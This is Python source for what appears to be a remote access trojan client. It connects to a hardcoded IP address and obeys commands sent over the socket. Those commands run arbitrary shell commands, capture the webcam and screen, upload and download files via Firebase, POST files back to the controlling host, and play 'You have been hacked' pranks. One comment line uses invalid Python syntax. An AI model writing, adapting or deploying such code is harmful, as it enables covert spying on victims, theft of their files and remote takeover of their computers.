import socket
import subprocess
import time

import cv2
import requests
import  pyrebase
import pyautogui
import pyttsx3


sock=socket.socket()
engine = pyttsx3.init()

ip="35.192.5.87"


sock.connect(("{}".format(ip),3389))

//firebase config
config={
  "apiKey": "",
  "authDomain": "",
  "projectId": "",
  "storageBucket": "",
  "databaseURL":"",
  "serviceAccount":"service_key.json"
   }

firebase=pyrebase.initialize_app(config)

def say(a):

    engine.say(a)
    engine.runAndWait()
    send("d0ne")


def upload(local_path,cloud_path,firebase=firebase):
  storage=firebase.storage()
  try:
    storage.child(cloud_path).put(local_path)
    send("d0ne")
  except:
    pass
  return


def download(cloud_path,fname,firebase=firebase):
  storage=firebase.storage()
  try:
    storage.download(cloud_path,fname)
    send("d0ne")
  except:
    pass
  return


def screen_capture():
    runtime = pyautogui.screenshot()
    runtime.save("screen.png")
    upload("screen.png","screen-{}.png".format(time.strftime("%Y%m%d-%H%M%S")))
    return

def send(a):
    i=0
    j=4028
    size=len(a)
    while True:
        sock.sendall(a[i:j+1].encode())
        i=j+1
        j=j+j
        a=a[i:j+1]
        if len(a)==0:
            break

    sock.send("d0ne".encode())
    return

def run_command(a):
    process = subprocess.Popen(a, stdout=subprocess.PIPE,shell=True)
    output = process.stdout.read()
    send(output.decode())
    return

def send_file(a="output.jpg"):
    if a!="output.jpg":
            requests.post("http://{}:5000/output".format(ip),data="output.{}".format(a[-3:]),files=open(a,"rb"))
            send("capture saved")
    else:
        requests.post("http://{}:5000/output".format(ip),data={"filename":"output.jpg"},files={"files":open(a,"rb")})
        send("capture saved")


def capture_webcam():
    cap=cv2.VideoCapture(0)


    while True:
        _,frame=cap.read()
        if _:
            cv2.imwrite("output.jpg",frame)
            upload("output.jpg","output-{}.jpg".format(time.strftime("%Y%m%d-%H%M%S")))

            break


while True:
    data=sock.recv(1024).decode().strip()


    if "run" in data.split():

        run_command(data.split(maxsplit=1)[1].strip())
    elif data=="capture":
        capture_webcam()
    elif data=="screen capture":
        screen_capture()
    elif data.split(maxsplit=1)[0].strip()=="upload":
        file=data.split(maxsplit=1)[1].strip()
        upload(file,file.split("/")[-1])
    elif data.split(maxsplit=1)[0].strip()=="download":
        download(data.split(maxsplit=1)[1].strip(),data.split(maxsplit=1)[1].strip())
    elif data.split(maxsplit=1)[0].strip()=="say":
        say(data.split(maxsplit=1)[1].strip())
    elif data=="bitch":
        run_command("start https://www.youtube.com/watch?v=iik25wqIuFo")
    elif data=="haunt":
        download("hacked.gif","hacked.gif")
        for i in range(50):
            run_command("start hacked.gif")
            say("You have been hacked")

    else:
        send("d0ne")
